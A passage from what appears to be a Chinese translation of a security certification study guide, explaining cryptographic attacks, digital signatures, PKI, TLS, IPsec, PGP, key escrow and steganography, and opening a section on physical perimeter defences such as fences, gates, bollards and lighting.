  \ 常用于密码哈希的慢速哈希算法示例包括 bcrypt（基于 Blowfish）和 scrypt。\n\n##### 密码学攻击\n\n密码分析师使用密码学攻击在没有密钥的情况下恢复明文。请记住，恢复密钥（有时称为“偷取密钥”）通常比破解现代加密更容易。这是执法部门在面对使用加密技术的嫌疑人时通常采取的做法：他们获取搜查令并尝试恢复密钥。\n\
  \n###### 暴力破解\n\n暴力破解攻击会生成整个密钥空间，即所有可能的密钥。给予足够的时间，明文将被恢复。这是一种对所有基于密钥的密码均有效的攻击，但一次性密码本除外。由于一次性密码本的密钥长度与明文相同，暴力尝试所有可能的密钥最终会恢复明文，但也会产生大量其他潜在明文，包括莎士比亚的所有作品。密码分析师将无法知道哪个潜在明文是真实的。这就是一次性密码本成为唯一可证明不可破解的加密形式的原因。\n\
  \n###### 社会工程学\n\n社会工程学利用人类心理绕过安全控制。该技术可通过诱骗密钥持有者泄露密钥来恢复密钥。手法多种多样，包括在致电服务台时冒充授权用户并请求重置密码。Information\
  \ Security Europe 曾尝试一种更直接的途径，以礼物交换用户密码：“在繁忙火车站外与陌生人交谈的伦敦办公室职工中，超过五分之一的人愿意用密码换一块巧克力”\
  \ [\\[39\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0195)。\n\n###### 彩虹表\n\
  \n彩虹表是明文及其匹配密文（通常为密码及其匹配哈希值）的预计算汇编。彩虹表极大地加速了多种类型的密码破解攻击，通常只需几分钟即可破解，而其他方法（如字典攻击、混合攻击和暴力破解密码尝试）可能需要更长时间。我们将在第\
  \ 6 章（Chapter 6），第 5 领域：身份与访问管理中讨论这些密码破解方法。\n\n许多人认为彩虹表只是密码/哈希组合的大型数据库。虽然它们看起来是这样工作的（尽管典型速度是每次查找几分钟，而非几秒或更短），但这并非彩虹表的内部工作原理。\n\
  \n虽然预计算有明显优势，但使用典型数据库存储那么多数据将需要 TB（或更多）级别的存储空间。存储所有可能的 Microsoft LANMAN 哈希和密码大约需要\
  \ 48 TB 数据；然而，Ophcrack 彩虹表 Linux 发行版（如 图 4.25 所示）仅使用 388 MB 表存储空间就能破解 99% 的 LANMAN\
  \ 哈希。这是如何做到的？\n\n![图 4.25 Ophcrack Windows 彩虹表 Linux 发行版。](img/f04-25-9780443187346.jpg)\n\
  \n\n\n图 4.25 Ophcrack Windows 彩虹表 Linux Live 发行版。\n\nPhilippe Oechslin 在其论文《实现更快的密码分析时间-内存权衡》中描述了这一挑战：“基于穷举搜索的密码分析攻击需要大量的计算能力或大量的时间才能完成。当同一攻击必须执行多次时，可以预先执行穷举搜索并将所有结果存储在内存中。一旦完成这种预计算，攻击几乎可以瞬间完成。遗憾的是，由于需要大量内存，这种方法并不切实际”[\\\
  [40\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0200)。\n\n彩虹表依赖于一种巧妙的时间/内存权衡。该技术由\
  \ Martin Hellman（Diffie-Hellman 算法的发明者之一）研究，并由 Philippe Oechslin 改进。长长的密码-哈希（明文-密文）对链被连接在一起。成千上万或数百万个对可能被连接成一条链（称为彩虹链），并且可以形成许多链，通过归约函数连接（该函数接受一个哈希值并将其转换为另一个可能的密码）。最后，链中的所有内容都可以被移除，只保留第一个和最后一个条目。这些链可根据需要重建，还原所有中间条目。这以一些时间和\
  \ CPU 周期为代价，节省了大量的存储空间。\n\n###### 已知明文\n\n已知明文攻击依赖于恢复并分析一对匹配的明文和密文：目的是推导出所使用的密钥。你可能会想，如果你已经有了明文，为什么还需要密钥：恢复密钥将允许你解密其他使用同一密钥加密的密文。\n\
  \n###### 选择明文和自适应选择明文\n\n在选择明文攻击中，密码分析师选择要加密的明文；目的是推导出密钥。在不知道密钥的情况下进行加密是通过“加密预言机”完成的，即一种在不泄露密钥的情况下进行加密的设备。这听起来可能牵强附会，但非常实用：VPN\
  \ 集中器在不泄露密钥的情况下将明文加密为密文（只有被授权管理该设备的用户才能看到密钥）。\n\n自适应选择明文攻击以第一轮的选择明文攻击开始。然后密码分析师根据上一轮的情况“自适应”地进行后续轮次的加密。\n\
  \n###### 选择密文和自适应选择密文\n\n选择密文攻击与选择明文攻击相似：区别在于密码分析师选择要解密的密文。这种攻击通常针对非对称密码系统发起，密码分析师可以选择用用户公钥签名（加密）的公开文档进行解密。\n\
  \n自适应选择密文攻击也与其明文对应攻击相似：它以第一轮的选择密文攻击开始。然后密码分析师根据上一轮的情况“自适应”地进行后续轮次的解密。\n\n######\
  \ 中间相遇攻击\n\n中间相遇攻击在一侧加密，在另一侧解密，并在中间相遇。最常见的攻击是针对“双重 DES”，它使用两个密钥按“加密、加密”的顺序进行加密。该攻击是一种已知明文攻击：攻击者拥有一份匹配的明文和密文副本，并试图恢复用于加密的两个密钥。\n\
  \n攻击者为密钥 1 生成每一个可能的值，并用每个值加密明文，保存中间（半加密）密文结果。DES 拥有 56 位密钥，因此这将需要 `2⁵⁶` 次加密。\n\n\
  然后攻击者为密钥 2 生成每一个可能的值，并用每个值解密密文。解密后，攻击者查找中间密文，寻找匹配项。如果存在匹配，攻击者就找到了密钥 1 和密钥 2。解密步骤最多将尝试\
  \ `2⁵⁶` 次，总共 `2⁵⁷` 次尝试（`2⁵⁶` 次加密 + 最多 `2⁵⁶` 次解密 = `2⁵⁷`）。\n\n换句话说，尽管密钥长度为 112 位，破解双重\
  \ DES 仅比破解 56 位单 DES 难两倍。这太容易了，因此不推荐使用双重 DES。3TDES 拥有 168 位的密钥长度，但由于中间相遇攻击，其有效强度为\
  \ 112 位：3TDES 有三个密钥和两个“中间”，其中一个可用于中间相遇攻击，绕过大约三分之一的工作量。\n\n###### 已知密钥\n\n“已知密钥攻击”这一术语具有误导性：如果密码分析师知道密钥，攻击就结束了。已知密钥意味着密码分析师了解关于密钥的某些信息，从而减少攻击它所需的工作量。如果密码分析师知道密钥仅由大写字母和数字组成，则在攻击中可以省略其他字符。\n\
  \n###### 差分密码分析\n\n*差分密码分析*旨在找出被加密的相关明文之间的“差异”。这些明文可能仅相差几位。它通常作为自适应选择明文攻击发起：攻击者选择要加密的明文（但不知道密钥），然后加密相关的明文。\n\
  \n然后密码分析师使用统计分析在密文中搜索非随机性的迹象，锁定明文有差异的区域。相关密文的每一位都应该有 50/50 的翻转几率：密码分析师寻找不符合这一规律的区域。任何这种潜在的规律都是恢复密钥的线索。\n\
  \n###### 线性密码分析\n\n*线性密码分析*是一种已知明文攻击，密码分析师找到大量使用同一密钥创建的明文/密文对。研究这些对以推导出创建它们所用密钥的信息。\n\
  \n差分分析和线性分析均可结合为*差分线性分析*。\n\n###### 实现攻击\n\n实现攻击利用在实现应用程序、服务或系统时犯下的错误（漏洞）。Bruce\
  \ Schneier 对实现攻击的描述如下：“许多系统因实现错误而失效。有些系统不能确保明文在加密后被销毁。其他系统使用临时文件来防止系统崩溃时的数据丢失，或使用虚拟内存来增加可用内存；这些功能可能会意外地在硬盘上留下明文。在极端情况下，操作系统会将密钥留在硬盘上。我们见过的一个产品使用特殊窗口进行密码输入。密码即使在窗口关闭后仍保留在窗口的内存中。无论该产品的加密技术有多好；它都被用户界面攻破了”[\\\
  [41\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0205)。\n\n###### 侧信道攻击\n\n\
  *侧信道*攻击利用物理数据来破解密码系统，例如监控加密或解密时使用的 CPU 周期或功耗。一些纯粹主义者可能声称这违反了某种规则，但正如 Bruce Schneier\
  \ 所说：“一些研究人员声称这是作弊。没错，但在现实世界的系统中，攻击者会作弊。他们的工作是恢复密钥，而不是遵守某种行为准则。安全系统的审慎工程师会预见到这一点并做出适应”[\\\
  [42\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0210)。\n\n####### 定时攻击\n\n\
  定时攻击是一种侧信道攻击，利用时间来破解系统或泄露敏感数据。想象一个登录表单，对于无效登录返回以下错误：\n\n*   无效用户/无效密码：“无此用户”\n*\
  \   有效用户/无效密码：“密码错误”\n\n在这种情况下，远程攻击者可以发起用户名收集攻击，尝试一系列用户名（asmith, bsmith, cmsith,\
  \ dsmith 等），并记录何时返回“密码错误”错误（标志着有效用户名）。网站设计者使用此逻辑来挫败用户名收集：\n\n\n\n\n*   **无效用户名**：返回\
  \ `“Login incorrect”`\n*   **有效用户名**：\n    *   对提供的密码进行哈希运算，并与用户的密码哈希值进行比较\n   \
  \ *   **有效密码**：认证用户\n    *   **无效密码**：返回 `“Login incorrect”`\n\n这似乎使得用户名收集成为不可能：无效用户/无效密码和有效用户/无效密码均返回\
  \ `“Login incorrect.”` 但后一种情况耗时更长：服务器必须检查哈希值（而对于无效用户则不检查哈希值）。这意味着快速响应 = 无效账户，慢速响应\
  \ = 有效账户。如果使用快速哈希算法（如 `SHA-3`），这种时序差异将难以测量，但使用慢速哈希算法（如 `bcrypt`，前文已讨论）时则更容易检测到。\n\
  \n###### 故障注入攻击\n\n侧信道攻击（前节讨论）是被动的：它们监控（读取）系统。故障注入攻击是主动的物理攻击：它们改变系统，通常通过注入电力、光或电磁干扰（`EMI`）等能量来实现。故障注入攻击（`FIAs`）使设备的物理条件超出其设计预期范围；例如，使用强烈的电磁（`EM`）脉冲、高环境温度，以及对设备供电电压进行欠压和过压操作。这些攻击可诱导内部电子元件产生错误，进而被利用来恢复加密密钥和其他秘密数据\
  \ [\\[43\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0215)。\n\n###### 勒索软件\n\
  \n勒索软件是一种利用强加密（如 `AES`）并扣留解密密钥以勒索赎金的恶意软件。勒索软件主要是一种针对可用性的攻击（阻止用户访问其文件），通常在系统被攻陷后部署。通常会加密所有（潜在）敏感或重要文档。以下是\
  \ Cryptolocker 加密的文件扩展名列表（非考点）：`*.odt`、`*.ods`、`*.odp`、`*.odm`、`*.odc`、`*.odb`、`*.doc`、`*.docx`、`*.docm`、`*.wps`、`*.xls`、`*.xlsx`、`*.xlsm`、`*.xlsb`、`*.xlk`、`*.ppt`、`*.pptx`、`*.pptm`、`*.mdb`、`*.accdb`、`*.pst`、`*.dwg`、`*.dxf`、`*.dxg`、`*.wpd`、`*.rtf`、`*.wb2`、`*.mdf`、`*.dbf`、`*.psd`、`*.pdd`、`*.pdf`、`*.eps`、`*.ai`、`*.indd`、`*.cdr`、`*.jpg`、`*.jpe`、`*.dng`、`*.3fr`、`*.arw`、`*.srf`、`*.sr2`、`*.bay`、`*.crw`、`*.cr2`、`*.dcr`、`*.kdc`、`*.erf`、`*.mef`、`*.mrw`、`*.nef`、`*.nrw`、`*.orf`、`*.raf`、`*.raw`、`*.rwl`、`*.rw2`、`*.r3d`、`*.ptx`、`*.pef`、`*.srw`、`*.x3f`、`*.der`、`*.cer`、`*.crt`、`*.pem`、`*.pfx`、`*.p12`、`*.p7b`、`*.p7c`\
  \ [\\[44\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0220)。\n\n加密完成后，勒索软件通常会更改桌面壁纸以显示警告（也可能显示图像和/或文本文件），其中包含如何支付赎金（通过加密货币如\
  \ `Bitcoin`）以取回加密密钥的说明。\n\n罪犯通常在收到赎金后释放密钥。通常设有支付时限（如 72 小时），若在此期间未支付赎金，密钥将被销毁。\n\
  \n良好的备份配合快速恢复可缓解勒索软件威胁。许多组织重视备份（这很重要），却忽视了从备份中恢复所需的时间（这同样非常重要）。如果整个数据中心都感染了勒索软件，从备份中恢复（诚实地）需要多长时间？在某些情况下，答案可能是数月，这导致勒索软件受害者为了加快恢复工作而支付赎金——即使他们拥有良好的备份。\n\
  \n###### 生日攻击\n\n生日攻击得名于生日悖论。其名称基于这样一个事实：在一个有 23 人或以上的房间里，至少有两人生日相同的概率超过 50%。许多人觉得这违反直觉，生日悖论也说明了为何许多人对概率（和风险）的直觉是错误的。你不是试图匹配某个特定的生日（如你自己的生日）；而是试图匹配任意一个生日。\n\
  \n如果你在一个挤满 23 人的房间里，你与其他 22 人中的每一个人生日相同的概率都是 1/365，总共 22/365 的机会。如果你匹配失败，你离开房间，Joe\
  \ 与剩余人员生日相同的概率为 21/365。如果 Joe 也失败，他离开房间，Morgan 的概率为 20/365，以此类推。如果你把 22/365 + 21/365\
  \ + 20/365 + 19/365 … + 1/365 相加，总概率将超过 50%。\n\n生日攻击用于制造哈希碰撞。正如匹配*你的*生日很难一样，找到一个与另一个输入哈希值碰撞的特定输入也很难。然而，正如匹配*任意*生日更容易一样，由于生日攻击，找到*任意*一个能与其他任意输入产生碰撞哈希的输入也更容易。\n\
  \n###### 密钥聚类\n\n任何加密密码的目标之一是只有唯一的密钥能从密文中导出明文。密钥聚类是指两个不同的对称密钥应用于同一明文时产生了相同的密文。这使得两个不同的密钥都能解密该密文。\n\
  \n##### 实现密码学\n\n对称、非对称和基于哈希的密码学并非孤立存在：它们在现实世界中被应用，常结合使用，以提供机密性、完整性、认证和不可抵赖性。\n\n\
  ###### 数字签名\n\n数字签名用于对文档进行加密签名。数字签名提供不可抵赖性，包括对签名者身份的认证，以及对文档完整性的证明（证明文档未被篡改）。这意味着发送者事后无法否认（或抵赖）曾对该文档签名。\n\
  \nRoy 想给 Rick 发送一封带数字签名的电子邮件。Roy 撰写邮件，即明文。然后他使用 `SHA-1` 哈希函数生成明文的哈希值。接着，他用自己的 `RSA`\
  \ 私钥加密该哈希值来创建数字签名。图 4.26 展示了这一过程。Roy 随后将签名附加到明文邮件中并点击发送。\n\n![图 4.26 创建数字签名 [45]。](images/B9780443187346000076/f04-26-9780443187346.jpg)\n\
  \n图 4.26 创建数字签名 [\\[45\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0225)。\n\
  \nRick 收到 Roy 的邮件，并对明文邮件生成自己的 `SHA-1` 哈希值。Rick 随后用 Roy 的 `RSA` 公钥解密数字签名，恢复出 Roy\
  \ 生成的 `SHA-1` 哈希值。Rick 然后将自己的 `SHA-1` 哈希值与 Roy 的进行比较。图 4.27 展示了这一过程。\n\n![图 4.27\
  \ 验证数字签名。](img/f04-27-9780443187346.jpg)\n\n图 4.27 验证数字签名。\n\n如果两个哈希值匹配，Rick 可知以下几点：\n\
  \n1.  邮件必定由 Roy 发送（只有 Roy 知道他的私钥）。这认证了 Roy 的发送者身份。\n2.  邮件未被篡改。这证明了邮件的完整性。\n\n如果哈希值匹配，Roy\
  \ 事后无法否认曾对该邮件签名。这就是不可抵赖性。如果哈希值不匹配，Rick 就知道要么不是 Roy 发的，要么邮件的完整性遭到破坏。\n\n> **注意**\n\
  >\n> 数字签名提供认证和完整性，二者构成不可抵赖性。它们不提供机密性：明文保持未加密状态。\n\n###### 消息认证码\n\n消息认证码（`MAC`）是一种使用密钥的哈希函数。常见的\
  \ `MAC` 实现是密码分组链消息认证码（`CBC-MAC`），它使用对称分组密码（如 `DES`）的 `CBC` 模式来创建 `MAC`。消息认证码提供完整性和真实性（证明发送者持有共享密钥）。\n\
  \n###### HMAC\n\n\n\n\n*散列消息认证码* (HMAC) 将共享密钥与散列运算相结合。IPsec 使用 HMAC（见下文）。\n\n双方必须预先共享一个密钥。共享后，发送方使用\
  \ XOR（异或）将明文与共享密钥结合，然后使用 MD5（称为 HMAC-MD5）或 SHA-1（称为 HMAC-SHA-1）等算法对输出进行散列。该散列值再次与密钥结合，从而生成\
  \ HMAC。\n\n接收方在本地将相同的明文与共享密钥结合，然后遵循上述相同过程，生成本地 HMAC。接收方将其与发送方的 HMAC 进行比较。如果两个 HMAC\
  \ 匹配，则发送方通过认证（这证明发送方知道共享密钥），并确保消息的完整性（消息未被篡改）。\n\n###### 公钥基础设施\n\n*公钥基础设施* (PKI)\
  \ 利用所有三种形式的加密来提供和管理*数字证书*。数字证书是由数字签名签署的公钥。数字证书可以是基于服务器的（例如用于 SSL 网站，如 [`www.ebay.com`](https://www.ebay.com)），也可以是基于客户端的（绑定到个人）。如果两者结合使用，则提供相互认证和加密。标准的数字证书格式是\
  \ X.509。\n\nNIST 特别出版物 800-15 描述了 PKI 的五个组成部分：\n\n*   签发和吊销证书的*证书颁发机构* (CA)\n* \
  \  为公钥与证书持有者身份及其他属性之间的绑定作担保的*组织注册机构* (ORA)\n*   获得证书并可对数字文档签名的*证书持有者*\n*   从已知的受信任\
  \ CA 公钥验证数字签名及其认证路径的*客户端*\n*   存储并提供证书和*证书吊销列表* (CRL) 的*存储库* [\\[46\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0230)\n\
  \n####### 证书颁发机构和组织注册机构\n\n数字证书由*证书颁发机构* (CA) 签发。组织注册机构 (ORA) 在向证书持有者签发证书前，对其身份进行认证。一个组织可以作为\
  \ CA 或 ORA 运营（或两者兼任）。\n\nCA 可以是私有的（内部运行）或公共的（如 VeriSign 或 Thawte）。例如，路人不能简单地请求并获得\
  \ [www.ebay.com](http://www.ebay.com) 的证书；他们必须证明有权这样做。这种认证由 CA 完成，可以包括商业记录调查、向域联系人发送电子邮件等类似方法。\n\
  \n####### 证书吊销列表\n\n证书颁发机构维护*证书吊销列表* (CRL)，顾名思义，其中列出了已被吊销的证书。如果私钥被盗、员工离职等，证书可能会被吊销。CRL\
  \ 是一个平面文件，扩展性不佳。*在线证书状态协议* (OCSP) 是 CRL 的替代方案，采用客户端-服务器设计，扩展性更好。\n\n####### 密钥管理问题\n\
  \n证书颁发机构签发数字证书并将其分发给证书持有者。在分发过程中，必须保证持有者私钥的机密性和完整性。\n\nPKI 中使用的公钥/私钥对应集中（且安全地）存储。用户丢失私钥就像忘记密码一样容易。如果丢失的私钥未安全存储，则使用匹配公钥加密的任何内容都将丢失（除非进行前文所述的密码分析）。\n\
  \n请注意，密钥存储不同于密钥托管。密钥存储意味着签发公钥/私钥对的组织保留一份副本。密钥托管，我们稍后将讨论，意味着由第三方组织（有时是多个组织）保留一份副本，通常用于执法目的。\n\
  \n已退役的密钥不得用于新事务，但可用于解密先前加密的明文。已销毁的密钥不再存在，不能用于任何目的。\n\n##### SSL 和 TLS\n\n安全套接字层\
  \ (SSL) 将 PKI 的强大功能引入 Web。SSL 对 Web 流量进行认证并提供机密性。*传输层安全性* (TLS) 是 SSL 的继任者。它们通常作为\
  \ HTTPS (*超文本传输安全协议*) 的一部分使用。\n\n当你连接到 [`www.isc2.org/`](https://www.isc2.org/)\
  \ 等网站时，数据是加密的。即使你没有预共享密钥，这也是成立的：数据从一开始就被加密。这是通过非对称加密完成的：你的浏览器下载 [www.isc2.org](http://www.isc2.org)\
  \ 的数字证书，其中包含该网站的公钥，并由证书颁发机构的私钥签名。如果你的浏览器信任该 CA（如 VeriSign），则该签名可认证该网站：你知道它是 [isc2.org](http://isc2.org)\
  \ 而不是流氓网站。然后，你的浏览器使用该公钥安全地交换对称会话密钥。私钥存储在 [isc2.org](http://isc2.org) Web 服务器上，允许其解密任何用公钥加密的内容。然后使用对称密钥加密会话的其余部分。\n\
  \n用于认证、密钥交换和对称加密的密码套件是灵活的：你的浏览器将与服务器协商每一项。支持的算法包括（但不限于）用于密钥交换的 RSA 和 Diffie-Hellman，用于认证的\
  \ RSA 和数字签名算法 (DSA)，以及用于机密性的 AES 和三重 DES。\n\nSSL 于 1990 年代为 Netscape Web 浏览器开发。SSL\
  \ 2.0 是首个发布版本；SSL 3.0 修复了版本 2 的多个安全问题。TLS 基于 SSL 3.0。TLS 与该版本非常相似，但有一些安全改进。虽然通常用于\
  \ HTTPS 以保护 Web 流量，但 TLS 也可用于其他应用程序，如 Internet 聊天和电子邮件客户端访问。TLS 1.3 是当前版本。\n\n#####\
  \ IPsec\n\nIPsec（互联网协议安全）是一套协议，为 IPv4 和 IPv6 都提供加密层。它是提供*虚拟专用网络* (VPN) 的方法之一，VPN\
  \ 允许你通过不安全网络（如互联网）发送私有数据（数据穿越公共网络，但却是“虚拟私有”的）。IPsec 包含两个主要协议：*认证头* (AH) 和*封装安全载荷*\
  \ (ESP)。AH 和 ESP 提供不同的功能，有时功能会重叠。\n\n支持 IPsec 的协议包括*互联网安全关联和密钥管理协议* (ISAKMP) 和*互联网密钥交换*\
  \ (IKE)。\n\n> **注意**\n>\n> 本章描述 IPsec 的加密方面：IPsec 的网络相关方面请参见第 5 章，领域 4：通信与网络安全。\n\
  \n####### AH 和 ESP\n\n认证头为每个网络数据包提供认证和完整性。AH 不提供机密性；它充当数据的数字签名。AH 还防范*重放攻击*，即数据从网络上被嗅探并重发，通常是为了欺诈性地重用加密的认证凭据。\n\
  \n封装安全载荷主要通过加密数据包数据来提供机密性。它也可以选择性地提供认证和完整性。\n\n####### 安全关联和 ISAKMP\n\n\n\n\n\n\
  ####### AH 和 ESP\n\nAH 和 ESP 可以单独使用，也可以组合使用。IPsec 安全关联（`SA`）是一个单工（单向）连接，可用于协商 ESP\
  \ 或 AH 参数。如果两个系统通过 ESP 通信，它们将使用两个 SA（每个方向一个）。如果系统除了 ESP 还利用 AH，则会再使用两个 SA，总共四个。一个称为安全参数索引（`SPI`）的唯一\
  \ 32 位数字用于标识每个单工 SA 连接。互联网安全关联和密钥管理协议（`ISAKMP`）管理 SA 的创建过程。\n\n###### 隧道模式和传输模式\n\
  \nIPsec 可用于隧道模式或传输模式。隧道模式由安全网关使用（可提供点对点 IPsec 隧道）。ESP 隧道模式加密整个数据包，包括原始数据包头部。ESP\
  \ 传输模式仅加密数据（不加密原始头部）；这通常用于发送和接收系统能够原生“讲” IPsec 的场景。\n\nAH 对原始 IP 头部进行认证，因此它常用于（配合\
  \ ESP）传输模式，因为原始头部未被加密。隧道模式通常单独使用 ESP（原始头部被 ESP 加密，从而受到保护）。\n\n> **注意**\n>\n> IPsec\
  \ 是一个由委员会设计的协议示例，这并非赞美。它过于复杂，包含多个重叠的部分。复杂性是安全的敌人。请参阅 Bruce Schneier 和 Niels Ferguson\
  \ 的 *A Cryptographic Evaluation of IPsec*（IPsec 密码学评估），他们在文中主张应完全移除 AH 模式和传输模式：“我们对\
  \ IPsec 的主要批评是其复杂性。IPsec 包含过多的选项和过度的灵活性；完成相同或类似的事情往往有多种方法” [[47]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0235)。参见\
  \ <https://www.schneier.com/academic/archives/2003/12/a_cryptographic_eval.xhtml>。\n\
  \n####### IKE\n\nIPsec 可以使用多种加密算法，例如用于完整性的 MD5 或 SHA-1，以及用于机密性的三重 DES 或 AES。互联网密钥交换协商算法选择过程。IPsec\
  \ 隧道的双方通常使用 IKE 协商至最高且最快的安全级别，例如如果双方都支持 AES，则选择 AES 而非单 DES 用于机密性。\n\n###### PGP\n\
  \n*Pretty Good Privacy*（PGP，优良隐私协议）将非对称加密带给了大众。Phil Zimmerman 于 1991 年发布 PGP 时引发了争议。这是普通计算机用户首次能够轻松利用非对称加密的力量，它允许陌生人（包括罪犯）在不预先共享密钥的情况下安全通信。\n\
  \n1991 年，PGP 源代码被发布到 Usenet 电子公告板系统后，Zimmerman 因涉嫌违反军火出口管制而遭到美国政府调查。检察官于 1996 年撤销了案件。RSA\
  \ 公司曾就 Zimmerman 在 PGP 中包含（当时）受专利保护的 RSA 算法向其投诉。Zimmerman 曾鼓励用户若使用该算法则向 RSA 支付许可费。为解决专利问题，Zimmerman\
  \ 同意停止发布 PGP（尽管副本仍可从其他来源自由获取）。\n\nPGP 提供了现代密码学套件：机密性、完整性、认证和不可抵赖性。它可用于加密电子邮件、文档或整个磁盘驱动器。PGP\
  \ 使用*信任网*模型来认证数字证书，而非依赖中央证书颁发机构（`CA`）。如果你信任我的数字证书能证明我的身份，信任网意味着你也信任我所信任的所有数字证书。换句话说，如果你信任我，你就信任我所信任的每个人。\n\
  \n###### S/MIME\n\nMIME（多用途互联网邮件扩展）提供了一种格式化电子邮件的标准方式，包括字符集和附件。S/MIME（安全/MIME）利用\
  \ PKI 对 MIME 编码的电子邮件进行加密和认证。客户端或客户端的电子邮件服务器（称为 S/MIME 网关）可执行加密操作。\n\n###### 托管加密\n\
  \n托管加密是指第三方组织持有一份公钥/私钥对的副本。私钥通常被分成两个或多个部分，每个部分由不同的受信任第三方组织托管，只有在获得适当授权（如法院命令）时，才会释放其持有的那部分密钥。这提供了职责分离。\n\
  \n托管加密的一个目标是在个人隐私与执法需求之间提供平衡。另一个目标是确保在密钥丢失或员工离职时，加密数据仍可恢复。\n\n####### Clipper 芯片\n\
  \nClipper 芯片是托管加密标准（`EES`）中使用的技术名称，这是美国政府于 1993 年宣布的一项在电信设备中部署托管加密的计划。该计划引发了媒体风暴，并于\
  \ 1996 年被放弃。\n\nClipper 芯片使用 Skipjack 算法，这是一种使用 80 位密钥的对称密码。该算法最初被列为机密。算法的保密性是另一个有争议的问题：算法的保密性并不能提供密码学强度，且保密算法往往被发现相当不安全。Skipjack\
  \ 后来于 1998 年解密（在 Clipper 芯片计划被放弃之后）。\n\n###### 隐写术\n\n隐写术是隐蔽通信的科学。该名称源于希腊语“steganos”和“graphein”，意为“覆盖”和“书写”，即隐蔽书写。例如，加密可为无线电传输提供机密性，但通信本身并未隐藏；仅隐藏了含义。隐写术隐藏了通信正在发生这一事实。\n\
  \n古希腊历史学家希罗多德在《希罗多德历史》中记录了隐写术的首次使用。希罗多德描述了剃光奴隶的头，在头上纹上指令，待头发长回后，派遣奴隶穿越敌军防线。另一种方法将信息藏在兔子的胃里。\n\
  \n现代隐写术将信息隐藏在数据文件（如图像）中。例如，8 位位图有 256 种颜色。假设图像中两个不同的白色像素（称为 `W0` 和 `W1`）在肉眼看来完全相同。你可以通过将\
  \ `W0` 和 `W1` 视为比特流来编码消息。\n\n假设文件按以下顺序包含一系列像素：`W1`、`W1`、`W1`、`W1`、`W0`、`W0`、`W0`、`W1`。你想在图像中编码“10101010”。将\
  \ `W0` 视为二进制 0，`W1` 视为二进制 1。然后相应地翻转像素，结果为 `W1`、`W0`、`W1`、`W0`、`W1`、`W0`、`W1`、`W0`。图\
  \ 4.28 显示了该过程。白色箭头表示像素未改变；黑色箭头表示像素已改变。\n\n![图 4.28 位图像素的隐写术替换。](img/f04-28-9780443187346.jpg)\n\
  \n图 4.28 位图像素的隐写术替换。\n\n该图像现包含隐藏消息“10101010”，尽管肉眼看起来相同（且大小未变）。图像的完整性已改变。此方法称为替换法。其他方法包括注入法（向文件添加数据，生成更大的文件）和新建文件法。替换法和注入法需要宿主文件；新建文件法顾名思义创建一个新文件。\n\
  \n通过隐写术隐藏的消息通常先经过加密，从而同时提供数据的机密性和通信的隐蔽性。\n\n### 外围防御\n\n\n\n\n\n#### 周界防御\n\n周界防御有助于防止、检测和纠正未经授权的物理访问。建筑物与网络一样，应采用纵深防御。任何单一防御都可能失效：因此，关键资产应受到多重物理安全控制的保护，例如围栏、门、墙壁和锁。理想的周界防御应当安全可靠，防止未经授权的进入，并在适用时同时提供认证和问责功能。\n\
  \n##### 围栏\n\n围栏的类型可能从简单的威慑手段（如 3 英尺/1 米高的围栏）到预防性设备，例如顶部带有刺铁丝的 8 英尺（2.4 米）高围栏。围栏的设计应将人员进出引导至受控点，如外部门和大门。\n\
  \n##### 大门\n\n表 4.12 中所示大门的强度范围从装饰性（旨在阻止进入的 I 类大门）到 IV 类大门（旨在防止汽车冲撞，如机场和监狱的大门）。更多信息请参阅\
  \ ASTM International 的“ASTM F2200”自动车行大门建造标准规范，网址：[`www.astm.org/f2200-20.xhtml`](https://www.astm.org/f2200-20.xhtml)。\n\
  \n表 4.12\n\n车行大门类型。\n\n| 类型 | 说明 |\n| --- | --- |\n| I 类 | 住宅（家用） |\n| II 类 | 商业/一般通行（停车场）\
  \ |\n| III 类 | 工业/限制通行（18 轮卡车装卸区） |\n| IV 类 | 限制通行（机场或监狱） |\n\n大门应设置在周界的受控点处。安全场所利用围栏和地形将交通流引导至这些点。\n\
  \n##### 阻车柱\n\n交通`阻车柱`是一种设计用于阻挡汽车的坚固立柱。该术语源自停泊时用于将船只系在码头上的短而结实的立柱（称为系船柱）。图 4.29\
  \ 展示了交通阻车柱。\n\n![图 4.29 不锈钢交通阻车柱。来源：https://commons.wikimedia.org/wiki/File:Stainless\\\
  _steel\\_bollard\\_SSP150.JPG；摄影：Leda Vannaclip。图片依据知识共享署名-相同方式共享 3.0 许可使用。](img/f04-29-9780443187346.jpg)\n\
  \n图 4.29 不锈钢交通阻车柱。来源：[`commons.wikimedia.org/wiki/File:Stainless\\_steel\\_bollard\\\
  _SSP150.JPG`](https://commons.wikimedia.org/wiki/File:Stainless_steel_bollard_SSP150.JPG)；摄影：Leda\
  \ Vannaclip。图片依据知识共享署名-相同方式共享 3.0 许可使用。\n\n阻车柱常安装在便利店前，以防止分不清油门和刹车的驾驶员冲入店内。它们用于安全设施以防止车辆进入（无论是故意还是意外）。许多安全设施使用大型混凝土花箱达到相同效果。这些装置通常放置在建筑物物理薄弱区域前方，如入口处。\n\
  \n##### 照明\n\n灯光既可作为检测控制，也可作为威慑控制。允许警卫看到入侵者的灯光属于检测控制。罪犯通常倾向于选择照明不足的目标而非更显眼的目标，因此灯光也可起到威慑作用。\n\
  \n灯光应足够明亮以照亮所需的视野范围（受保护区域）。灯光类型包括菲涅耳灯，以奥古斯丁·让·菲涅耳命名。这与灯塔最初使用的灯光类型相同，灯塔利用菲涅耳透镜将光线聚焦在特定方向。\n\
  \n光度测量术语包括`流明`：一支蜡烛产生的光量。光度历史上以`烛光`为单位测量；一烛光等于每平方英尺一流明。基于公制的`勒克斯`现在更常用：一勒克斯等于每平方米一流明。\n\
  \n##### 闭路电视\n\n闭路电视（CCTV）是一种检测设备，用于协助警卫发现限制区域内的入侵者。使用普通光谱的 CCTV 需要足够的能见度来照亮摄像头可见的视野。红外设备通过显示热量实现“夜视”功能。\n\
